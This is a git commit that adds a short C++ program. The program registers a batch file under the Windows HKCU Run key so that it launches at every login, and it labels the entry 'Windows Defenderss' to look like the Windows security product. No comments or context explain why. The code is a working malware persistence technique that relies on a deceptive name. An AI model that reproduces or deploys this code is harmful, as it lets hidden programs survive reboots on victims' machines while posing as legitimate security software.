397b7c6db9c14a8b2cdd1dc731c3c565979fb28a
sudo-su-FDEL <58496330+sudo-su-FDEL@users.noreply.github.com>
2021-05-22 22:04:21 -0500

    Add files via upload

---
+++ Source.cpp
@@ -0,0 +1,20 @@
+#include <stdio.h>
+#include<windows.h>
+
+using namespace std;
+
+int main(){
+HKEY hkey;
+LONG regoOpenResult;
+WCHAR PATH[] = L"C:\\Users\\testdirect3\\caller.bat";
+
+regoOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
+
+RegSetValueEx(hkey, L"Windows Defenderss", 0, REG_SZ, (LPBYTE)PATH, sizeof(PATH));
+
+RegCloseKey(hkey); 
+
+
+
+}
+
